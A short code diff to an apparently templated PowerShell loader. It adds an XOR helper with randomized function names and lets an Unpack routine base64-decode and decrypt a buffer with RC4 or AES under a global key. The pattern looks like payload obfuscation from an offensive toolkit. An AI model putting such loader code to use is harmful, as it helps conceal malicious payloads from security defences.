@@ -57,11 +57,23 @@ function Decrypt-AES {
     $result
 }
 
+{# Redefine xor for speed #}
+function {{symbol_name("xor")}} {
+    param (${{symbol_name('A')}}, ${{symbol_name('B')}});
+    return [Byte](${{symbol_name('A')}} -bxor ${{symbol_name('B')}})
+}
+
 function {{symbol_name("Unpack")}} {
     param ($buffer)
 
     $Result = [System.Convert]::FromBase64String($buffer)
-    $Result = Decrypt-AES $Result $GLOBAL_KEY
+    {% if slow_encryption %}
+        {{'Write-Debug "Encryption mode: slow (RC4)"'|debug}}
+        $Result = Decrypt-RC4 $Result $GLOBAL_KEY
+    {% else %}
+        {{'Write-Debug "Encryption mode: fast (AES)"'|debug}}
+        $Result = Decrypt-AES $Result $GLOBAL_KEY
+    {% endif %}
     if (-not $Result) {return}
     $Result = [System.Text.Encoding]::UTF8.GetString($Result)
 
